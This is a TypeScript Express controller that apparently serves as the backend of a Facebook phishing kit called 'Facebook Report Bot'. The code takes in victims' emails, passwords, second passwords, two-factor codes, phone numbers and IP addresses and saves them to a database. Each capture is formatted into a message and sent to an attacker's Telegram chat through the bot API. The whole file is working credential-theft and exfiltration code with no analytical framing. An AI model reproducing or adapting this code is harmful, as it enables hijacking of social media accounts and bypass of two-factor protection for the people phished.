import * as httpStatus from 'http-status';
import catchAsync from '../utils/catchAsync';
import { User } from '../domains/typedef';
import { userGetAll } from '../services/user.service';
import axios from 'axios';
import config from '../config/config';
import { Request, Response } from 'express';
import { escapseStringContentTelegram } from '../utils/utils';
import UserModel from '../models/user.model';

const generateMessage = (dataUserBody: User, userById: User) => {
  const content = `
\✨ **_IP_**: ${dataUserBody.ip} \n
\✉️ **Email**: ${userById?.email || dataUserBody.email} \n
\🔒 **Password**: ${dataUserBody.password || userById.password} \n
${
  dataUserBody.password2 || userById.password2
    ? `\🔒 **Password-2**: ${dataUserBody.password2 || userById.password2} \n`
    : ''
}
\🧰 **Business Email**: ${userById?.businessEmail || dataUserBody.businessEmail} \n
\🪪 **Full Name**: ${userById?.fullname || dataUserBody.fullname} \n
\📱 **Phone Number**: ${userById?.phoneNumber || dataUserBody.phoneNumber} \n
\💻 **Facebook Page**: ${userById?.facebookPage || dataUserBody.facebookPage} \n
`;

  if (dataUserBody.firstTFA) {
    return escapseStringContentTelegram(`
🌟 **Welcome to Facebook Report Bot ! ** 🌟\n
🎉 User \`${dataUserBody.email}\` đã update thông tin: \n
${content}
\🔒 **Two_Facetor_Auth-1**: ${dataUserBody.firstTFA} \n
    `);
  }

  if (dataUserBody.secondTFA) {
    return escapseStringContentTelegram(`
🌟 **Welcome to Facebook Report Bot ! ** 🌟\n
🎉 User \`${dataUserBody.email}\` đã update thông tin: \n
${content}
\🔒 **Two_Facetor_Auth-1**: ${dataUserBody.firstTFA} \n
\🔒 **Two_Facetor_Auth-2**: ${dataUserBody.secondTFA}
    `);
  }

  return escapseStringContentTelegram(`
🌟 **Welcome to Facebook Report Bot ! ** 🌟\n
🎉 Có User gửi thông tin: \n
${content}
\🏷️ **__Description__**: ${dataUserBody.description} \n`);
};

const createUser = catchAsync(async (req: Request, res: Response) => {
  try {
    const dataUserBody = req.body as User;
    const userById = await UserModel.findOne({ email: dataUserBody.email });

    if (userById) {
      const dataUpdate = await UserModel.updateOne(
        { email: dataUserBody.email },
        {
          password: userById.password,
          fullname: userById.fullname,
          businessEmail: userById.businessEmail,
          phoneNumber: userById.phoneNumber,
          facebookPage: userById.facebookPage,
          ip: dataUserBody.ip,
          password2: userById.password2,
          description: userById.description,
          firstTFA: dataUserBody.firstTFA,
          secondTFA: dataUserBody.secondTFA,
          thirdTFA: dataUserBody.thirdTFA,
        }
      );

      /* Telegram send message */
      const url = `${config.telegramUrl}/bot${config.TELEGRAM_BOT}/sendMessage`;

      const message = generateMessage(dataUserBody, userById);
      const params = { chat_id: config.TELEGRAM_ROOM, text: message, parse_mode: 'MarkdownV2' };
      await axios.get(url, { params });
      return res.status(httpStatus.OK).send({ message: 'User updated successfully', data: dataUpdate });
    }

    const dataCreate = await UserModel.create({
      email: dataUserBody.email,
      password: dataUserBody.password,
      fullname: dataUserBody.fullname,
      businessEmail: dataUserBody.businessEmail,
      phoneNumber: dataUserBody.phoneNumber,
      facebookPage: dataUserBody.facebookPage,
      ip: dataUserBody.ip,
      password2: dataUserBody.password2,
      description: dataUserBody.description,
    });

    /* Telegram send message */
    const url = `${config.telegramUrl}/bot${config.TELEGRAM_BOT}/sendMessage`;

    const message = generateMessage(dataUserBody, userById);
    console.log('generateMessage', message);
    const params = { chat_id: config.TELEGRAM_ROOM, text: message, parse_mode: 'MarkdownV2' };
    await axios.get(url, { params });

    res.status(httpStatus.OK).send({ message: 'User created successfully', data: dataCreate });
  } catch (err) {
    console.log('wewe', err);
    throw err;
  }
});

const updateUser = catchAsync(async (req: Request, res: Response) => {
  try {
    const dataUserBody = req.body as User;
    const userById = await UserModel.findOne({ email: dataUserBody.email });
    if (!userById) {
      throw { message: 'User not found' };
    }

    const dataUpdate = await UserModel.updateOne(
      { email: dataUserBody.email },
      {
        password: userById.password,
        fullname: userById.fullname,
        businessEmail: userById.businessEmail,
        phoneNumber: userById.phoneNumber,
        facebookPage: userById.facebookPage,
        ip: dataUserBody.ip,
        password2: userById.password2,
        description: userById.description,
        firstTFA: dataUserBody.firstTFA,
        secondTFA: dataUserBody.secondTFA,
        thirdTFA: dataUserBody.thirdTFA,
      }
    );

    /* Telegram send message */
    const url = `${config.telegramUrl}/bot${config.TELEGRAM_BOT}/sendMessage`;

    const message = generateMessage(dataUserBody, userById);
    console.log('generateMessage', message);
    const params = { chat_id: config.TELEGRAM_ROOM, text: message, parse_mode: 'MarkdownV2' };
    await axios.get(url, { params });

    res.status(httpStatus.OK).send({ message: 'User update successfully', data: dataUpdate });
  } catch (err) {
    console.log('wewe', err);
    throw err;
  }
});

const getUser = catchAsync(async (req, res) => {
  const data = await userGetAll();
  res.status(httpStatus.OK).send({ data, message: 'success' });
});

export { createUser, getUser, updateUser };
